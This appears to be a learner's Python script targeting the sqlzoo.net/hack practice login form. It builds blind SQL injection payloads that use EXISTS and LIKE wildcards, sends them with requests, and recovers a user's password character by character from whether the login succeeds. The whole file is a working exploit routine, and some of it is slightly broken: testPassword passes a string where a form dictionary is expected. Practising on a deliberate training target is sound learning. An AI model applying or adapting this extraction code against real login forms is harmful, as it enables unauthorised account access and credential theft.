import requests

def checkPasswordCharacter(character, username, url, index = "no index"):
   """checks for character(s) at specified location in the password 

   Args:
      index: integer representing the location in the password string to check for character
         if a negative integer, will count from end of string, e.g. -1 is last character in the string
         default value is for no index specified, will pad with arbitrary characters

      username: username associated with password being checked for character

      url: url of the username & password form
      
      character: a single character or group of characters to check

   Returns: 
      bool: boolean
         true iff character is found at index in the password string
         if index = "no index" then it returns true iff character is in the password for user username

   Raises:
      tbd -- needs to be updated later!

      from the quick start guide:
         Errors and Exceptions
            
         In the event of a network problem (e.g. DNS failure, refused connection, etc), Requests will raise a ConnectionError exception.
         
         Response.raise_for_status() will raise an HTTPError if the HTTP request returned an unsuccessful status code.
         
         If a request times out, a Timeout exception is raised.
         
         If a request exceeds the configured number of maximum redirections, a TooManyRedirects exception is raised.
         
         All exceptions that Requests explicitly raises inherit from requests.exceptions.RequestException.
   """

   payload = constructPasswordPayload(character, username, index)
   query = sendQuery(payload, url)
   return readQuery(query, username)


def sendQuery(payload, url):
   """take an url and opens an http connection with payload as a parameter

   Args:
      payload: dictionary
         keys are names of elements in form -- name and password
         values are submission for that element of the form
      
      url: string
         base url to the form being submitted

   Returns:
      text result from the form submission

   Raises:
      tbd

   """

   r = requests.get(url, params = payload)
   return r.text

def readQuery(query, username):
   """ reads the html returned by the query and determines if login was successful

   Args:
      query: String
         html result of a form submission -- from sqlzoo.net/hack

      username: String
         username of login attempt

   Returns: boolean
      true iff login was successful

   Raises: tbd

   """
   return username in query



def constructPasswordPayload(character, username, index = "no index"):
   """

   Args:
      index: integer 
         represents the location of character in the password string encoded
         if a negative integer, will count from end of string, e.g. -1 is last character in the string
         default value is for no index specified, will pad with arbitrary characters

      character: character(s) in password to check for username

      username: username associated with password

   Returns: 
      payload: dictionary
         form parameters as keys and data to submit as values
         keys are username and password

   """

   sqlQuery = constructSQLQuery(character, username, index)

   dickt = {"name" : sqlQuery, "password" : sqlQuery}

   return dickt;


def constructSQLQuery(character, username, index = "no index"):
   """makes SQL query for constructPasswordPayload.
      
      Another helper function, see documentation for constructPasswordPayload

   """

   # the LIKE command uses % and _ as wildcards. % for arbitrary characters(0 to n), _ for one. 
   # Looks like this is not MS access. Using * instead of % does not work, which makes sense.
   # https://www.w3schools.com/SQL/sql_like.asp
   # https://www.w3schools.com/sql/sql_wildcards.asp

   sqlQuery = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password LIKE '" 


   # No! make a password string in this if elif else block and concatonate that string at the end of sqlQuery

   passStr = ""

   if(index == "no index"):
      passStr += "%" + character + "%"

   elif(index == 0):
      passStr += character + "%"

    #len(padding) = index; all "_" characters
      
   elif(index >= 0):
      padding = "_" * index
      passStr = padding + character + "%"

   else:
      index   = -1 * index -1 # so index is non-negative; -1 since end is -1 and begining is 0 not 1. 
      padding = "_" * index
      passStr = "%" + character + padding

   sqlQuery += passStr + "') AND ''='"

   return sqlQuery;


def testPassword(password, username, url):
   """
   takes a hypothetical password and username tests it.

   Args:
      password: string
         hypothetical password
      username: string
         username
      url:
         url of the username and password form

   Returns: 
      boolean
         true iff username and password pair is valid and correct. 

   Raises:
      tbd

   """

   payload = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password = '" + password + "') AND ''='"

   r = sendQuery(payload, url)

   return readQuery(r, username);








"""
links:

https://docs.python.org/3/tutorial/controlflow.html#more-on-defining-functions


"""


